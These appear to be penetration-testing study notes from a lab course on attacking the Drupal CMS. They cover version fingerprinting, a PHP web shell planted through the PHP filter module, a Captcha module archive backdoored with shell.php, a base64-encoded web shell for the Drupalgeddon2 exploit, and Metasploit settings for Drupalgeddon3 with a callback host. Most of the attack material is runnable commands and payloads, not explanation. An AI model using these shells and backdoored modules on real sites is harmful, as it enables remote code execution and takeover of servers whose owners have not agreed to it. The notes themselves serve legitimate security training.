## Info

Drupal supports three types of users by default:

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

`/node/<nodeid>`

`CHANGELOG.txt`


## Enumeration

**Checking install**

`L3pr3ch4un@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal`

Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.

**Version Fingerprinting**

`L3pr3ch4un@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""`

**Automated scanners**

`L3pr3ch4un@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local`

## Attacking

**Code Execution**

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

From here, we could tick the check box next to the module and scroll down to `Save configuration`. 

Next, we could go to Content --> Add content and create a `Basic page`.

`<?php system($_REQUEST['cmd']);?>`

`Text format drop-down to PHP code.`

**Testing backdoor**

`[!bash!]$ curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid | cut -f4 -d">"`

From version 8 onwards, the PHP Filter module is not installed by default.

**Alternative**

`[!bash!]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

Once downloaded go to `Administration` > `Reports` > `Available updates`.

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

And repeat above steps

**Backdoor Module**

```
[!bash!]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
[!bash!]$ tar xvf captcha-8.x-1.2.tar.gz
[!bash!]$ echo "<?php system(\$_GET[cmd]); ?>" > shell.php
[!bash!]$ echo -e "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\n</IfModule>" > .htaccess
[!bash!]$ mv shell.php .htaccess captcha
[!bash!]$ tar -czvf captcha.tar.gz captcha/
```

`Manage`>`Extend`>`Install new module`

Browse to the backdoored Captcha archive and click `Install`.

`[!bash!]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id`

## Vulnerabilities aka Drupalgeddon

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

**Drupalgeddon 1**

We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.

[!bash!]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

**Drupalgeddon 2**

Edit echo command in exploit to 

` echo "PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+Cg==" | base64 -d | tee shell.php`

```
[!bash!]$ python3 drupalgeddon2.py
[!bash!]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?cmd=id
```

**Drupalgeddon 3**

`Vulnerable versions`:`Drupal 7.x,8.5.x,8.4.x`

Obtain a valid session cookie.

![](https://academy.hackthebox.com/storage/modules/113/burp.png)

Once we have the session cookie, we can set up the exploit module as follows.

```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=<session cookie>
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
```
